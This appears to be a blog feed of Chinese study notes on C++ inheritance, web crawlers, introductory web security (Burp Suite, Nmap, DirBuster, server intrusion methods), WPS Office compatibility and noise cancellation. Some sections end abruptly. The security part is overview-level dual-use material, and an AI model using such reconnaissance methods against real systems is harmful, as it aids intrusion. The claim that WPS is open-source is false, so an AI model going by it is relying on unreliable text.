 构造函数执行顺序如下：&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;调用基类&lt;/li&gt;
&lt;li&gt;调用内嵌对象成员&lt;/li&gt;
&lt;li&gt;派生类&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;基类成员在派生类中的访问属性的其他方法&#34;&gt; 基类成员在派生类中的访问属性的其他方法&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;同名成员&lt;br&gt;
为了在派生类中使用基类的同名成员，必须在该成员名之前加上基类名和作用域标识符::(在派生类中使用基类同名函数)&lt;br&gt;
 基类名：：成员名&lt;/li&gt;
&lt;li&gt;访问声明&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;多重继承&#34;&gt; 多重继承&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;多重继承派生类的声明&lt;br&gt;
 class 派生类名：继承方式 1  基类名 1，…，继承方式 n  基类名 n&lt;br&gt;
{&lt;br&gt;
派生类新增的数据成员和成员函数&lt;br&gt;
}；&lt;/li&gt;
&lt;li&gt;多重继承派生类的构造函数与析构函数&lt;br&gt;
派生类名 (参数总表)：基类名 1 (参数表 1), 基类名 2 (参数表 2),…, 基类名 n (参数表 n)&lt;br&gt;
{&lt;br&gt;
派生类新增成员的初始化语句&lt;br&gt;
}&lt;br&gt;
 析构函数执行顺序与构造函数相反&lt;/li&gt;
&lt;li&gt;虚基类&lt;br&gt;
 1. 如果一个类中有多个直接基类，并且这些基类又有共同的基类，为了避免同名函数不知道如何调用，产生了虚机类&lt;br&gt;
 2. 语法形式：&lt;br&gt;
class 派生类名：virtual 继承方式 基类名&lt;br&gt;
 {&lt;br&gt;
}&lt;br&gt;
 3. 虚基类初始化&lt;br&gt;
 (1) 所有直接间接的派生类都必须在构造函数初始化列表中列出对虚基类的构造和函数的调用，以初始化虚基类中定义的数据成员&lt;br&gt;
 (2) 调用顺序为：&lt;br&gt;
虚基类&lt;br&gt;
非虚基类&lt;br&gt;
成员对象&lt;br&gt;
派生类&lt;br&gt;
 (3) 对于多个虚基类或非虚基类，构造函数的执行顺序总是先左后右，自上而下&lt;/li&gt;
&lt;li&gt;基类与派生类对象之间的赋值兼容关系&lt;br&gt;
公有继承派生类对象既是基类对象又是派生类对象&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;多态性&#34;&gt; 多态性&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;运算符重载&lt;br&gt;
运算符重载可以是类外定义的普通函数，也可以是类的成员函数或友元函数&lt;br&gt;
有时候我们需要将类中定义的几个对象的数据进行计算，但是由于类的对象不是基本数据类型，而是用户自定义的数据类型，所以导致不能进行计算，这时需要进行运算符重载来实现。&lt;br&gt;
1. 在类外定义的运算符重载函数&lt;br&gt;
类名 operator 运算符 (类名 对象 1，类名 对象 2…)&lt;br&gt;
{&lt;br&gt;
类名 新对象&lt;br&gt;
计算过程&lt;br&gt;
}&lt;br&gt;
 C++ 绝大运算符可以重载，以下运算符不能重载&lt;br&gt;
。成员访问运算符&lt;br&gt;
. *      成员指针访问运算符&lt;br&gt;
：：作用域运算符&lt;br&gt;
 sizeof 长度运算符&lt;br&gt;
？：条件运算符&lt;br&gt;
不允许用户自己定义新的运算符&lt;br&gt;
 2. 友元运算符重载函数&lt;br&gt;
在类中定义&lt;br&gt;
 friend 函数类型 operator 运算符 (形参表)&lt;br&gt;
{&lt;br&gt;
函数体&lt;br&gt;
}&lt;br&gt;
 在类外定义&lt;br&gt;
函数类型 operator 运算符 (形参表)&lt;br&gt;
{&lt;br&gt;
函数体&lt;br&gt;
}&lt;br&gt;
 3. 成员运算符重载函数&lt;br&gt;
在类中定义&lt;br&gt;
函数类型 operator 运算符 (形参表)&lt;br&gt;
{&lt;br&gt;
函数体&lt;br&gt;
}&lt;br&gt;
 声明：函数类型 operator 运算符 (形参表)；&lt;br&gt;
在类外定义&lt;br&gt;
函数类型 ：：operator 运算符 (形参表)&lt;br&gt;
{&lt;br&gt;
函数体&lt;br&gt;
}&lt;/li&gt;
&lt;li&gt;指针悬挂问题&lt;br&gt;
详见 CSDN 收藏夹&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;虚函数&#34;&gt; 虚函数&lt;/span&gt;&lt;/h2&gt;

 &lt;h2&gt;&lt;span id=&#34;爬虫简介&#34;&gt; 爬虫简介&lt;/span&gt;&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;什么是爬虫&lt;br&gt;
通过编写程序，模拟浏览器上网，然后让其去互联网上抓取数据的过程&lt;/li&gt;
&lt;li&gt;爬虫的价值&lt;br&gt;
爬取的数据&lt;/li&gt;
&lt;/ol&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
&lt;h2&gt;&lt;span id=&#34;爬虫合法性探究&#34;&gt; 爬虫合法性探究&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;在法律中不被禁止&lt;/li&gt;
&lt;li&gt;具有违法风险&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;爬虫初探&#34;&gt; 爬虫初探&lt;/span&gt;&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;爬虫在使用场景中的分类&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;通用爬虫：抓取系统重要组成部分，抓取一整张页面数据&lt;/li&gt;
&lt;li&gt;聚焦爬虫：建立在通用爬虫基础之上，抓取的是页面中特定的局部内容&lt;/li&gt;
&lt;li&gt;增量式爬虫：检测网站中数据更新的情况，只会抓取网站中最新更新出来的数据&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;爬虫的矛与盾&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;反爬机制&lt;br&gt;
门户网站，可以通过制定相关的策略或者技术手段，防止爬虫程序进行网站数据的爬取&lt;/li&gt;
&lt;li&gt;反反爬策略&lt;br&gt;
破解门户网站的反爬机制，从而获取门户网站信息&lt;/li&gt;
&lt;li&gt;robots.txt 协议：&lt;br&gt;
君子协议：规定了网站中的哪些数据可以被爬虫爬取哪些数据不可以被爬取&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;http-和-https-协议&#34;&gt; http 和 https 协议&lt;/span&gt;&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;http 协议&lt;br&gt;
就是服务器和客户端进行数据交互的一种形式。&lt;/li&gt;
&lt;/ol&gt;

 &lt;h2&gt;&lt;span id=&#34;web-安全简介&#34;&gt; Web 安全简介&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span id=&#34;服务器是如何被入侵的&#34;&gt; 服务器是如何被入侵的&lt;/span&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;过去的黑客攻击大多数是直接针对姆比送进行攻击，比如端口扫描、一些服务的密码爆破 (FTP、数据库)、缓冲区溢出攻击等方式直接获取目标权限&lt;br&gt;
 C 段渗透：攻击者通过渗透同一网段内的一台主机对目标主机进行 ARP 等手段渗透&lt;br&gt;
社会工程学：高端攻击者必须掌握的技能&lt;/li&gt;
&lt;/ol&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
&lt;h3&gt;&lt;span id=&#34;如何更好的学习-web-安全&#34;&gt; 如何更好的学习 web 安全&lt;/span&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;黑客都是程序员，但程序员不一定是黑客&lt;/li&gt;
&lt;li&gt;C/C++、Java、C# 、PHP、Python、HTML、JavaScript、数据库 (SQL)&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;深入-http-请求流程&#34;&gt; 深入 HTTP 请求流程&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;当客户端与 Web 服务器进行交互时，就存在 Web 请求，这种请求都基于应用层协议 (HTTP 协议) 交互数据&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;http-协议解析&#34;&gt; HTTP 协议解析&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;发起 HTTP 请求&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;在浏览器地址栏输入一个 URL，回车后就发起了 HTTP 请求&lt;/li&gt;
&lt;li&gt;或者可以用 curl.exe 工具发起请求，通过 curl+URL 命令就可以&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;HTTP 协议详解&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;HTTP 请求只能由客户端发起，而服务器不能主动向客户端发送数据&lt;/li&gt;
&lt;li&gt;HTTP 遵循请求 / 应答模型&lt;br&gt;
 (1) HTTP 请求&lt;br&gt;
包括：请求行 (请求方法)、请求头 (消息报文)、请求正文&lt;br&gt;
 (2) HTTP 响应&lt;br&gt;
包括：响应行、响应头 (消息报文)、响应正文 (消息主题)&lt;/li&gt;
&lt;li&gt;HTTP 请求方法&lt;br&gt;
包括：GET、HEAD、POST、PUT、DELETE、TRACE、CONNECT、OPTIONS&lt;/li&gt;
&lt;li&gt;HTTP 状态码，HTTP 状态码由三位数字构成&lt;br&gt;
第一位数字定义了响应的类别：&lt;br&gt;
(1) 1xx：信息提示，表示请求已被成功接收，继续处理。范围：100~101&lt;br&gt;
 (2) 2xx：成功，服务器成功的处理了请求。范围：200~206&lt;br&gt;
 (3) 3xx：重定向，重定向状态码用于告诉浏览器客户端，它们访问的资源已被移动，并告诉客户端新的资源地址位置，这时，浏览器将重新对新资源发起请求。范围：300~305&lt;br&gt;
 (4) 4xx：客户端错误状态码，有时客户端会发送一些服务器 无法处理的东西，比如：格式错误、URL 不存在。范围：400~415&lt;br&gt;
 (5) 5xx：有时候客户端发送了一条有效请求，但 Web 服务器自身却出错了，用来描述服务器内部错误。范围：500~505&lt;/li&gt;
&lt;li&gt;HTTP 消息&lt;br&gt;
包括：请求头、响应头、普通头、实体头&lt;br&gt;
 (1) 请求头&lt;br&gt;
允许客户端向服务端传递请求的附加信息和客户端自身的信息&lt;br&gt;
包括：Host、User-Agent、Referer、Cookie、Range、x-forword-for、Accept、Accept-Charset&lt;br&gt;
 (2) 响应头&lt;br&gt;
服务器根据请求向客户端发送的 HTTP 头&lt;br&gt;
包括：Server、Set-Cookie、Last-Modified、Location、Refresh&lt;br&gt;
 (3) 普通头&lt;br&gt;
传输消息&lt;br&gt;
 (4) 实体头&lt;br&gt;
定义了关于实体正文和请求所标识的资源的元信息 (实体内容的属性)&lt;br&gt;
 包括：Content-Type、Content-Encoding、Content-Length、Last-Modified&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;HTTP 协议与 HTTPS 协议的区别&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;HTTP 是超文本传输协议，信息是明文传输，HTTPS 是具有安全性的 SSL 加密传输协议&lt;/li&gt;
&lt;li&gt;完全不同的链接方式，HTTP：80 端口，HTTPS：443 端口&lt;/li&gt;
&lt;li&gt;HTTPS 需要用到 ca 申请证书&lt;/li&gt;
&lt;li&gt;HTTP 连接相对简单，是无状态的&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;span id=&#34;截取-http-请求&#34;&gt; 截取 HTTP 请求&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;burpsuite&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;简介&lt;br&gt;
 BurpSuite 是用于攻击 web 应用程序的集成平台，它包含了许多 Burp 工具，所有的工具都共享一个能处理并显示 HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。是一个为渗透测试人员开发的集成平台，利用 BurpSuite，可以更高效更快速的发现系统或者服务漏洞。&lt;/li&gt;
&lt;li&gt;功能&lt;br&gt;
 (1) Target (目标)—— 显示目标目录结构的的一个功能，也就是站点。&lt;br&gt;
(2) Proxy (代理)—— 拦截 HTTP/S 的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。&lt;br&gt;
(3) Spider (蜘蛛)—— 应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。&lt;br&gt;
(4) Scanner (扫描器)—— 高级工具，执行后，它能自动地发现 web 应用程序的安全漏洞。&lt;br&gt;
(5) Intruder (入侵)—— 一个定制的高度可配置的工具，对 web 应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用 fuzzing 技术探测常规漏洞。&lt;br&gt;
(6) Repeater (中继器)—— 一个靠手动操作来触发单独的 HTTP 请求，并分析应用程序响应的工具。&lt;br&gt;
(7) Sequencer (会话)—— 用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。&lt;br&gt;
(8) Decoder (解码器)—— 进行手动执行或对应用程序数据者智能解码编码的工具。&lt;br&gt;
(9) Comparer (对比)—— 通常是通过一些相关的请求和响应得到两项数据的一个可视化的 “差异”。&lt;br&gt;
(10) Extender (扩展)—— 可以让你加载 BurpSuite 的扩展，使用你自己的或第三方代码来扩展 Burp Suit 的功能。&lt;br&gt;
(11) User Options (设置)—— 对 BurpSuite 的一些设置&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Fiddler&lt;br&gt;
Fiddler 是一款优秀的 Web 调试工具，它可以清晰的记录所以浏览器与服务器之间的通信信息 (HTTP 和 HTTPS)，并且允许你设置断电，修改输入输出数据&lt;/li&gt;
&lt;li&gt;WinSoc Expert&lt;br&gt;
WinSoc Expert 是一个用来监视和修改网络发送和接收数据的程序&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;信息探测&#34;&gt; 信息探测&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span id=&#34;google-hack&#34;&gt; Google Hack&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;搜索子域名&lt;br&gt;
利用 Google 搜索网站子域名是一件非常简单也非常复杂的事情，简单是指只要用 Google 搜索一下即可，复杂指要从海量信息中寻找子域名&lt;/li&gt;
&lt;li&gt;搜集 Web 信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;span id=&#34;nmap-初体验&#34;&gt; Nmap 初体验&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;安装 Nmap&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;概念&lt;br&gt;
 Nmap 是一个开源的网络连接端扫描软件，用来扫描计算机开放的网络连接端，确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统。Nmap 增加了许多实用的插件，可以用来检测 SQL 注射、网页爬行、数据库密码检测，号称 “扫描之王”&lt;/li&gt;
&lt;li&gt;使用&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;DirBuster&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;概念&lt;br&gt;
在渗透测试中，会探测 Web 目录结构和隐藏的敏感文件。通过探测可以了解网站的结构，获取管理员的一些敏感信息，比如网站的后台管理界面、文件上传界面，有时甚至可能扫出网站的源代码。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;漏洞扫描&#34;&gt; 漏洞扫描&lt;/span&gt;&lt;/h2&gt;

 &lt;ol&gt;
&lt;li&gt;与操作系统的兼容性&lt;br&gt;
最新版本的 WPS 对 Windows (Win2000-Win10)、Linux、Mac、Android (Android4.0 或更高版本)、iOS (iOS 所有的 iphone 固件版本以上，iOS 12 及以上) 都表示支持&lt;br&gt;
 PDF 新增：兼容系统控件中的功能（长按取词、复制、朗读，定义）&lt;/li&gt;
&lt;li&gt;与数据的兼容性&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;不同版本间的数据兼容性&lt;br&gt;
支持新旧版本界面风格随时切换&lt;br&gt;
一般来说高版本支持低版本，但是高版本中出现一些新功能，在低版本中可能会出现一些小问题&lt;/li&gt;
&lt;li&gt;不同软件间的数据兼容性&lt;br&gt;
与 Microsoft Office 中的 Word，Excel，PowerPoint 一一对应，应用 XML 数据交换技术，无障碍兼容 docx.xlsx.pptx，pdf 等文件格式，你可以直接保存和打开 Microsoft Word、Excel 和 PowerPoint 文件，也可以用 Microsoft Office 轻松编辑 WPS 系列文档。&lt;br&gt;
无隔阂兼容 MS-Office 加密信息、宏文档 内容互联、知识分享 —— 以提升效率为核心的互联网应用 。（文档方面）&lt;br&gt;
支持.ppt.pptx.pot.potx.pps.dps.dpt 等文件格式的打开和播放，包括加密文档（演示方面）&lt;br&gt;
支持 Airplay、DLNA 播放 PPT&lt;br&gt;
 支持 xls、xlt、xlsx、xltx、et、ett 等格式的查看，包括加密文档（表格方面）&lt;br&gt;
支持金山快盘、Dropbox、Box、GoogleDrive、SkyDrive、WebDAV 等多种主流网盘&lt;/li&gt;
&lt;/ul&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;与浏览器的兼容性&lt;br&gt;
各大浏览器只要设置兼容后，基本都可以打开&lt;/li&gt;
&lt;li&gt;与中间件的兼容性&lt;/li&gt;
&lt;li&gt;与平台软件的兼容性&lt;br&gt;
（4.5 具体体现在下面这些详细版本）&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;个人版&lt;br&gt;
高版本的 wps office 基本上可以兼容各版本的 Microsoft office。&lt;br&gt;
除了在文档格式上兼容，WPS 在使用习惯、界面功能上，都与微软 Office 深度兼容&lt;/li&gt;
&lt;li&gt;校园版&lt;br&gt;
全面兼容 Office 格式，新增 PDF 组建支持&lt;br&gt;
论文查重：多平台选择，计算重复率，定位到重复段落，提供参考性替换内容&lt;br&gt;
简历助手：多平台选择简历模板库，一次填写，一键投递&lt;/li&gt;
&lt;li&gt;专业版&lt;br&gt;
不仅在操作界面上与微软 Office 兼容，还支持直接打开和保存为微软 Office 格式的文档，同时，WPS Office 成熟的二次开发平台，保证了与微软 Office 一致的二次开发接口、API 接口、对象模型，兼容的 VBA 环境，支持 COM 加载插件等机制，实现了平滑迁移现有的电子政务平台、应用系统。&lt;br&gt;
支持 XML 标准：支持 OOXML、UOF2.0 (最新版标文通)，遵循 XML 标准，让政府和企业办公中的数据交换与数据检索更方便高效。&lt;br&gt;
WPS Office 提供了多套风格不同的界面，在经典界面与新界面之间，用户可以无障碍转换。&lt;/li&gt;
&lt;li&gt;租赁版&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;轻办公版本&lt;br&gt;
桌面客户端、网页端、移动端的多平台访问&lt;br&gt;
跨平台：有了云服务，便可以随时随地在你使用的任何设备上创建编辑文档。&lt;/li&gt;
&lt;li&gt;印象笔记版本&lt;br&gt;
可以在 2013 界面与旧版本界面之间切换，提供主题多样化选择。&lt;/li&gt;
&lt;li&gt;imo 版本&lt;br&gt;
对企业所需要的一系列功能都兼容，不在只限于文档、ppt 等内容，可以包括电子公告、企业邮箱、电子投票、电子考勤、日程提醒、网络文件柜、远程协助、群发文件传输等&lt;/li&gt;
&lt;li&gt;搜狐云存储版本&lt;br&gt;
支持 web 端、PC 端、移动端多平台数据同步，实现数据无缝对接，随时随地访问云端文件，轻松实现移动办公。&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;移动版&lt;br&gt;
兼容 Android、iOS 操作系统&lt;br&gt;
支持微软 Office、PDF 等 47 种文档格式&lt;br&gt;
支持查看和编辑 doc/docx 文档（文字）&lt;br&gt;
支持 xls/xlsx 文档的查看和编辑，以及多种 Excel 加解密算法，已支持 305 种函数和 34 种图表模式（表格）&lt;br&gt;
支持 ppt/pptx 文档的查看、编辑和加解密，支持复杂的 SmartArt 对象和多种对象动画 / 翻页动画模式。（演示）&lt;br&gt;
使用支持 Miracast、DLNA 和米联的手机或平板电脑即可使用无线投影功能将文档投影在电视和投影仪上。（演示）&lt;/li&gt;
&lt;li&gt;移动专业版&lt;br&gt;
通过成熟的 SDK 接口技术兼容 OA、ERP、财务等系统的移动端应用开放的 SDK 机制，实现成熟的系统集成。WPS Office 移动专业版具备的 API 接口不仅开放而且高效易用；无论在 iOS 平台还是 Android 平台，WPS Office 都提供成熟的 SDK 方案，能够与移动 OA、ERP、CRM 等系统的安全交互。&lt;/li&gt;
&lt;li&gt;Android 版&lt;br&gt;
金山 WPS Office 移动版支持多种文档格式，如 doc、docx、wps、xls、xlsx、et、ppt、dps、pptx、txt…… 文档的查看及编辑。（文档）&lt;br&gt;
支持 xlsx 格式文档批注查看、插入以及保存新增，持打开 xml 格式文档。（表格）&lt;br&gt;
兼容显示及保存 pptx 格式文档中的自选图形（演示）&lt;/li&gt;
&lt;li&gt;IOS 版&lt;br&gt;
没查到。。。&lt;br&gt;
网上反馈的一些兼容性小问题&lt;br&gt;
 1、电脑端字体调整好在具体的某一页，在手机端会造成格式上调或者下调。&lt;br&gt;
2、WPS 插入 Excel 表的时候不是全部自动化的，需要自己调整表格，还要裁剪。&lt;br&gt;
3、Excel 导入图表时，手机端与电脑端的图片效果不一致。&lt;br&gt;
4、wps 中 ppt 的动画效果 &amp;quot;平滑&amp;quot; 效果没有。&lt;br&gt;
5、office 中 PPT 支持插入 3D 模型、动态 3D、动态 3D 的多个视角&lt;br&gt;
 6、office 中 PPT 的设计灵感功能强大 (将图片一键排版、人脸识别技术进行智能裁剪、纯文本 PPT 进行排版&lt;br&gt;
 7、wps 对第三方软件的兼容性较小，有一些插件根本不能用 (wps 是开源软件，跟很多第三方开源软件没有建立联系，用起来很棘手）&lt;br&gt;
8、WPS 没有适配触屏操作，在上课一体机触屏操作不好用&lt;/li&gt;
&lt;/ul&gt;

 &lt;h2&gt;&lt;span id=&#34;准备&#34;&gt; 准备&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;从噪音污染的例子引入话题，引入降噪，简单讲述降噪的历史发展&lt;br&gt;
物理原理简单了解  (图理结合)&lt;br&gt;
 降噪类型 (图理结合)&lt;br&gt;
 涉及计算机领域的知识&lt;br&gt;
降噪耳机对我们生活影响 (健康、价格、使用范围、优缺点、目前发展趋势)&lt;br&gt;
 qq 视频，软件实现降噪？&lt;br&gt;
大家 (知乎、各论坛、各种研究学者) 对降噪耳机的看法，我的看法&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
&lt;h2&gt;&lt;span id=&#34;噪音污染&#34;&gt; 噪音污染&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;噪音的来源非常多，飞机或汽机车等交通工具、工厂、工地、日常生活都会产生噪音，因此噪音可以说是无处不在。噪音被归类为环境污染之一，在法律上被政府具体量化噪音标准。&lt;/p&gt;
&lt;p&gt;自工业革命开始，地球上的环境噪音不断在增加，噪音不只会干扰交谈及生活更会衍生出健康与安全问题，因此才会有 ANC 主动降噪的需求，进而有科学家研究理论及研发降噪功能。&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;发展过程&#34;&gt; 发展过程&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;1936 年，德国物理学家卢埃格提出了主动降噪的概念，还申请了专利，但是欧洲专利有效期只有 20 年，所以还没有等到用主动降噪专利赚钱，专利期就到了，这也没什么，就像电脑技术，1946 年就在美国宾夕法尼亚大学问世，但是真正的商用也是 1971 年。&lt;/p&gt;
&lt;p&gt;小故事：1978 年，一个男人在欧洲飞往波士顿的飞机上，本来想听一点音乐，但是飞机引擎的噪音破坏了雅兴，因此下飞机后直奔麻省的公司，开始推导演算，写出了主动降噪耳机最原始的方程式，后来他调集核心研发团队，开启了降噪科技的研究，这个男人就是 Bose 的创始人，Amar G. Bose 博士。&lt;/p&gt;
&lt;p&gt;经过 11 年的研发 1989 年，首款商用 Bose 降噪耳机才诞生，这只是商用，并不是民用，最早只应用于军事领域，专供飞行员使用，受到了美国军方的追捧。&lt;/p&gt;
&lt;p&gt;直到 2000 年，Bose 具有了稳定的商用市场后，Bose 的工程师开始将主动降噪技术应用到民用耳机，紧接着推出了大名鼎鼎的 QC 降噪耳机系列，把降噪耳机推向了普通大众。&lt;/p&gt;
&lt;p&gt;降噪耳机领域，另一个大厂就是索尼，索尼一直扮演最佳配角，直到 2016 年 8 月，索尼发布了头戴式无线降噪耳机 MDR-1000X，此款产品让索尼与 Bose 一起站上了巅峰&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;物理原理-简单了解不用深入&#34;&gt; 物理原理  (简单了解，不用深入)&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;(1) 噪声：频率、强弱变化无规律、杂乱无章的机械波。&lt;br&gt;
(2) 传播特点：不同频率的声音，会有不同的传播特性，声波在传播过程中都会存在衰减。&lt;br&gt;
(3) 衰减：&lt;br&gt;
・扩散衰减&lt;br&gt;
物体振动发出的声波向四周传播，声波能量逐渐扩散开来。能量的扩散使得单位面积上所存在的能量减小，听到的声音就变得微弱。单位面积上的声波能量随着声源距离的平方而递减。&lt;br&gt;
・吸收衰减&lt;br&gt;
声波在固体介质中传播时，由于介质的粘滞性而造成质点之间的内摩擦，从而使一部分声能转变为热能；同时，由于介质的热传导，介质的稠密和稀疏部分之间进行热交换，从而导致声能的损耗，这就是介质的吸收现象。介质的这种衰减称为吸收衰减。通常认为，吸收衰减与声波频率的一次方、频率的平方成正比。&lt;br&gt;
・散射衰减&lt;br&gt;
当介质中存在颗粒状结构（如液体中的悬浮粒子、气泡，固体中的颗粒状结构、缺陷、搀杂物等）而导致的声波的衰减称散射衰减。通常认为当颗粒的尺寸远小于波长时，散射衰减与频率的四次方成正比；当颗粒尺寸与波长相近时，散射衰减与频率的平方成正比。&lt;br&gt;
(4) 总结：&lt;br&gt;
高频声音易于衰减，低频声音较难衰减。对于高频噪声，通常采用的是物理阻隔的方法，例如采用更多的吸声材料，这也是所谓的被动降噪，而对于低频噪声，吸声材料的作用就有限了，此时主动降噪也就成为了必要手段。而也正是因为对于高低频噪声不同的降噪特性，主动降噪和被动降噪技术被综合地使用很多降噪耳机中。&lt;/p&gt;
&lt;p&gt;(5) 相位：&lt;/p&gt;
&lt;p&gt;佛家里讲 “凡有所相，皆是虚妄”，俗语说 “相由心生”，这都是看得见的表相。&lt;/p&gt;
&lt;p&gt;在物理学中，&lt;strong&gt;相位&lt;/strong&gt;的描述是：&lt;strong&gt;周期性运动在各个时刻所处的不同状态&lt;/strong&gt;。不光描述机械运动的时候能遇到相位，在机械波、交流电甚至天文学上，这个词使用的也很普遍。这里我们只讲机械运动的相位（为了便于同学理解）。&lt;/p&gt;
&lt;p&gt;在机械振动中，&lt;strong&gt;相位描述的是做机械振动的物体的振动状态&lt;/strong&gt;。更多的是拿来对两个振动物体的振动步调进行比较。确切一些说；是拿来对做简谐运动的两个质点的振动步调进行比较。&lt;/p&gt;
&lt;p&gt;譬如，两个相同的单摆，把摆球拉起一定角度。如果摆球 A 和 B 同时释放，我们说它们的相位相同；如果 A 球领先于 B 球释放，我们说 A 球的相位领先（或超前）于 B 球，或者说 B 球的相位落后于 A 球。&lt;/p&gt;
&lt;p&gt;在振动图像上，我们来做个对比，更直观。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;譬如下面这个图：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic1.zhimg.com/50/v2-9843298321f819a15a978070d1d8ab48_hd.jpg?source=1940ef5c&#34; alt=&#34;img&#34;&gt;&lt;img src=&#34;https://pic1.zhimg.com/80/v2-9843298321f819a15a978070d1d8ab48_720w.jpg?source=1940ef5c&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;可以看出，A 领先于 B 振动，A 的相位领先 B。&lt;/em&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;再来看这个图：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic1.zhimg.com/50/v2-e745ff59e343ae704581d4c83e3d3e3a_hd.jpg?source=1940ef5c&#34; alt=&#34;img&#34;&gt;&lt;img src=&#34;https://pic1.zhimg.com/80/v2-e745ff59e343ae704581d4c83e3d3e3a_720w.jpg?source=1940ef5c&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;可以看出 A 和 B 同相振动。摆球 A 和摆球 B 在任一时刻位移方向总相同，振动方向也总相同，同时达到正向最大位移，也同时到达负向最大位移。这样的情况叫 A 和 B 同相位振动，简称同相振动。&lt;/em&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;再来看这个图：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic3.zhimg.com/50/v2-bf1c89e5e4c7ccc082672722c3190d3f_hd.jpg?source=1940ef5c&#34; alt=&#34;img&#34;&gt;&lt;img src=&#34;https://pic3.zhimg.com/80/v2-bf1c89e5e4c7ccc082672722c3190d3f_720w.jpg?source=1940ef5c&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;可以看出，A 和 B 反相振动。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;在任意时刻，A 和 B 的位移方向总相反，振动方向也总相反，A 位于正向最大位移处时 B 位于负向最大位移处，A 位于负向最大位移处时 B 位于正向最大位移处。这样的情况叫 A 和 B 反相位振动，简称反相振动。&lt;/em&gt;&lt;/p&gt;
